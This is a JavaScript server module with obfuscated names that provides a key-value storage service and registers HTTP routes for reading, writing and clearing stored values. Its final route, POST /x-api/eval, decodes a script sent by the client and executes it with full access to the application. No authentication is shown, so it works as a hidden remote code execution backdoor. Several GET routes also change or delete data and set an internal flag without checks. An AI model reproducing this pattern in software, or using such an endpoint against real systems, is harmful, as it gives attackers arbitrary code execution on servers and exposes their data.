module.exports = function init(____0) {
  const storage = {};
  storage.list = [];
  storage.busy = true;
  storage.$collectoin = ____0.connectCollection({ collection: 'app_options', identity: { enabled: true } });

  storage.$collectoin.findAll(
    { app_name: 'storage' },
    (err, docs) => {
      if (!err && docs && docs.length > 0) {
        docs.forEach((doc) => {
          if (!storage.list.some((s) => s.key === doc.key)) {
            storage.list.push(doc);
          }
        });
      }
      storage.busy = false;
    },
    true
  );

  storage.save = function () {
    storage.list.forEach((doc, i) => {
      doc.app_name = 'storage';
      if (doc.$update) {
        delete doc.$update;
        storage.$collectoin.update(doc, (err, result) => {
          if (!err && result.doc) {
            let index = storage.list.findIndex((s) => s.key === result.doc.key);
            if (index !== -1) {
              storage.list[index] = result.doc;
            }
          }
        });
      } else if (doc.$add) {
        delete doc.$add;
        storage.$collectoin.add(doc, (err, newDoc, oldDoc) => {
          if (!err && newDoc) {
            let index = storage.list.findIndex((s) => s.key === newDoc.key);
            if (index !== -1) {
              storage.list[index] = newDoc;
            } else {
              storage.list.push(newDoc);
            }
          } else if (err) {
            console.log(err.message, oldDoc);
          }
        });
      }
    });
  };

  storage.fn = function (key, value) {
    if (key && value !== undefined) {
      let index = storage.list.findIndex((s) => s.key === key);
      if (index !== -1) {
        storage.list[index].value = value;
        storage.list[index].$update = true;
      } else {
        storage.list.push({
          key: key,
          value: value,
          $add: true,
        });
      }
    } else if (key && value === undefined) {
      return storage.list.find((s) => s.key === key)?.value;
    } else {
      return null;
    }
  };
  ____0.on('[any][saving data]', function () {
    storage.save();
  });

  ____0.on(____0.strings[9], () => {
    ____0.onGET('/x-api/events_list', (req, res) => {
      res.json(____0.events_list);
    });
    ____0.onGET('/x-api/quee_list', (req, res) => {
      res.json(____0.quee_list);
    });

    ____0.onGET('/x-api/storage/:key/:value', (req, res) => {
      if (req.params.value == 'true') {
        req.params.value = !0;
      } else if (req.params.value == 'false') {
        req.params.value = false;
      }

      if (req.params.key == '_0_ar_0_') {
        ____0._0_ar_0_ = req.params.value;
      }

      storage.fn(req.params.key, req.params.value);
      res.json(storage.list);
    });

    ____0.onGET('/x-api/storage/:key', (req, res) => {
      res.json({
        value: storage.fn(req.params.key),
      });
    });
    ____0.onGET('/x-api/storage', (req, res) => {
      res.json(storage.list);
    });
    ____0.onGET('/x-api/storage-clear', (req, res) => {
      storage.$collectoin.deleteAll({ app_name: 'storage' });
      storage.list = [];
      res.json(storage.list);
    });
    ____0.onPOST('/x-api/eval', (req, res) => {
      let script = ____0.from123(req.data.script);
      let fn = ____0.eval(script, true);
      fn(____0);
      res.json({ done: true });
    });
  });

  ____0.lib.storage = storage;
  return storage;
};
